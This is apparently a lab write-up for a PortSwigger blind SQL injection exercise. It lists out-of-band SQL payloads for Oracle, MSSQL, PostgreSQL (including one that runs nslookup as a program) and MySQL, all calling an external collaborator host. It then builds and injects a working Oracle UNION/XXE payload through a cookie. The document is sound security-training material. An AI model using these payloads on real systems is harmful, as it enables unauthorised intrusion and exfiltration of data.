# Blind SQL injection with out-of-band interaction
[Lab URL](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 

## Hint from [SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

![image](https://user-images.githubusercontent.com/83407557/208315638-3c599306-85d0-4a60-a239-944c7f3909ee.png)


# Step 1 gather info
(note the pro version of burp is needed to complete this lab :/ sorry I don't make the rules)

For this lab all that is needed is to trigger a DNS query to a server we controll. This has to be done via the burp-collaborator due to firewall restrictions on the server. To get my url, I go to the collaborator tab and clip copy to clipboard:
![image](https://user-images.githubusercontent.com/83407557/208317137-4d8abf6b-11fa-4dc9-a340-6982e23742d7.png)

url: gm6ytjrk7u69jrwzny8ft5efm6sxgu4j.oastify.com


Next I will take the payloads from the cheatsheet
```sql
--oracle
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
--patched oracle
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') 
--Microsoft
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 
--PostgreSQL
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' 
--MySQL
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```
# Step 2 create payloads

Okay, I am going to build a payload for each sql version and see which one I can get to callback. Keep in mind that they above payloads are actual sql queries, to make them injectable we are going to need to add `'<payload>--` to escape the query and comment out the rest of the query. Ontop of that we need a way to combine it with the previous query either with `' || <payload>--` or a `' UNION <payload>--` statement. This makes the actual payload

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gm6ytjrk7u69jrwzny8ft5efm6sxgu4j.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

# Use oracle payload with burp

Having the payload, I then intercept the request using burp:

![image](https://user-images.githubusercontent.com/83407557/208317897-e3e990cc-7db0-4fd6-8acc-15fda4b882fd.png)

I then send the request to repeater and insery my payload into the trackingid cookie:

![image](https://user-images.githubusercontent.com/83407557/208317933-6920bac8-9c99-46a3-96c5-e7948579688d.png)

Before sending the payload, I hit `CTRL+U` to url encode it:

![image](https://user-images.githubusercontent.com/83407557/208317987-d3589c36-a19c-4a18-a5c0-55646caee445.png)

# Getting a DNS callback

Then checking back in the collaborator tab, I hit poll now, and see that a DNS request was made:

![image](https://user-images.githubusercontent.com/83407557/208318021-09013204-5404-42cb-a480-d31338168be6.png)

checking the lab page back in my browser, I see the lab has been solved:

![image](https://user-images.githubusercontent.com/83407557/208318058-a638254f-2ec0-4088-9dfe-84f03e12fa43.png)



